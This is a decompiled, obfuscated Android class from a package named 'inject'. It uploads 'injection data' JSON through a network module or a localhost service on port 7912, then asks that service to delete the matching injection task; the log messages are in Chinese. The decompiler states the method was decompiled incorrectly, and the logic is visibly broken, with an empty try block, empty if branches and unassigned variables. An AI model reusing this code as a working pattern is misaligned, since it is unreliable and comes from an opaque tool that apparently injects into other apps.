package com.storm.safe.rock.inject;

import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.Charset;
import kotlin.Result;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.text.AbstractC0779a1;
import okio.Segment;
import org.json.JSONObject;
import p000.AbstractC0577hd;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.RunnableC1052p1;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.inject.jbqfkndyx$sendInjectionData$1", m214403f = "jbqfkndyx.kt", m214404l = {241}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class jbqfkndyx$sendInjectionData$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public dqtvuisjd f51952a1;

    /* renamed from: a2 */
    public int f51953a2;

    /* renamed from: a3 */
    public final /* synthetic */ JSONObject f51954a3;

    /* renamed from: a4 */
    public final /* synthetic */ jbqfkndyx f51955a4;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public jbqfkndyx$sendInjectionData$1(JSONObject jSONObject, jbqfkndyx jbqfkndyxVar, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f51954a3 = jSONObject;
        this.f51955a4 = jbqfkndyxVar;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new jbqfkndyx$sendInjectionData$1(this.f51954a3, this.f51955a4, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((jbqfkndyx$sendInjectionData$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Removed duplicated region for block: B:57:0x0177  */
    /* JADX WARN: Removed duplicated region for block: B:59:0x017a  */
    /* JADX WARN: Removed duplicated region for block: B:62:0x00cc A[EXC_TOP_SPLITTER, SYNTHETIC] */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        boolean z;
        HttpURLConnection httpURLConnection;
        OutputStream outputStream;
        String strM210590e1;
        dqtvuisjd dqtvuisjdVar;
        Object obj2;
        jbqfkndyx jbqfkndyxVar = this.f51955a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f51953a2;
        JSONObject jSONObject = this.f51954a3;
        boolean z2 = true;
        try {
        } catch (Exception e) {
            e = e;
            z = false;
        }
        if (i == 0) {
            kg1.m213544f4(obj);
            dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
            C0323a8 c0323a8M211471g5 = c0290a0 != null ? c0290a0.m211471g5() : null;
            if (c0323a8M211471g5 != null) {
                this.f51952a1 = c0290a0;
                this.f51953a2 = 1;
                Object objM211673e0 = c0323a8M211471g5.m211673e0(jSONObject, this);
                if (objM211673e0 == coroutineSingletons) {
                    return coroutineSingletons;
                }
                dqtvuisjdVar = c0290a0;
                obj2 = objM211673e0;
            }
            z = false;
            if (z) {
                z2 = z;
            } else {
                try {
                    t60.m214714d6("jbqfkndyx", "📤 尝试通过 local-service 转发上传...");
                    URLConnection uRLConnectionOpenConnection = new URL("http://127.0.0.1:7912/injectionData").openConnection();
                    t60.m214693b4(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
                    httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
                    httpURLConnection.setConnectTimeout(5000);
                    httpURLConnection.setReadTimeout(10000);
                    httpURLConnection.setRequestMethod("POST");
                    httpURLConnection.setRequestProperty("Content-Type", "application/json");
                    httpURLConnection.setDoOutput(true);
                    outputStream = httpURLConnection.getOutputStream();
                } catch (Exception e2) {
                    tz0.m214807a7("❌ local-service 转发异常: ", e2.getMessage(), "jbqfkndyx");
                }
                try {
                    String string = jSONObject.toString();
                    t60.m214694b5(string, "injectionData.toString()");
                    Charset charset = AbstractC0577hd.f56650a0;
                    byte[] bytes = string.getBytes(charset);
                    t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
                    outputStream.write(bytes);
                    outputStream.close();
                    int responseCode = httpURLConnection.getResponseCode();
                    try {
                        InputStream inputStream = httpURLConnection.getInputStream();
                        t60.m214694b5(inputStream, "conn.inputStream");
                        strM210590e1 = b81.m210590e1(new BufferedReader(new InputStreamReader(inputStream, charset), Segment.SIZE));
                    } catch (Exception unused) {
                        strM210590e1 = "";
                    }
                    httpURLConnection.disconnect();
                    if (responseCode == 200 && AbstractC0779a1.m213652a5(strM210590e1, "\"success\":true", false)) {
                        t60.m214714d6("jbqfkndyx", "✅ 注入数据已通过 local-service 转发成功");
                    } else {
                        t60.m214704c5("jbqfkndyx", "❌ local-service 转发失败: HTTP " + responseCode + " → " + strM210590e1);
                        z2 = z;
                    }
                } finally {
                }
            }
            if (!z2) {
                t60.m214704c5("jbqfkndyx", "❌ 两个通道都失败，注入数据未能上传（任务保留，下次继续）");
            }
            return C1351vv.f60710b1;
        }
        if (i != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        dqtvuisjdVar = this.f51952a1;
        kg1.m213544f4(obj);
        obj2 = ((Result) obj).f57559a0;
        int i2 = Result.f57558a1;
        if (obj2 instanceof Result.Failure) {
            z = false;
        } else {
            t60.m214714d6("jbqfkndyx", "✅ 注入数据已通过 NetworkManager 上传成功");
            try {
                try {
                    URLConnection uRLConnectionOpenConnection2 = new URL("http://127.0.0.1:7912/removeInjectionTask?packageName=" + jbqfkndyxVar.f51949a1).openConnection();
                    t60.m214693b4(uRLConnectionOpenConnection2, "null cannot be cast to non-null type java.net.HttpURLConnection");
                    HttpURLConnection httpURLConnection2 = (HttpURLConnection) uRLConnectionOpenConnection2;
                    httpURLConnection2.setConnectTimeout(3000);
                    httpURLConnection2.setReadTimeout(3000);
                    httpURLConnection2.setRequestMethod("GET");
                    httpURLConnection2.getResponseCode();
                    httpURLConnection2.disconnect();
                    t60.m214714d6("jbqfkndyx", "✅ 已通知 local-service 删除注入任务: " + jbqfkndyxVar.f51949a1);
                } catch (Exception e3) {
                    t60.m214726f4("jbqfkndyx", "⚠️ 通知 local-service 删除任务失败: " + e3.getMessage());
                }
                jbqfkndyxVar.runOnUiThread(new RunnableC1052p1(dqtvuisjdVar, 21, jbqfkndyxVar));
                z = true;
            } catch (Exception e4) {
                e = e4;
                z = true;
                tz0.m214810b0("⚠️ NetworkManager 上传失败: ", e.getMessage(), "jbqfkndyx");
                if (z) {
                }
                if (!z2) {
                }
                return C1351vv.f60710b1;
            }
        }
        if (z) {
        }
        if (!z2) {
        }
        return C1351vv.f60710b1;
    }
}
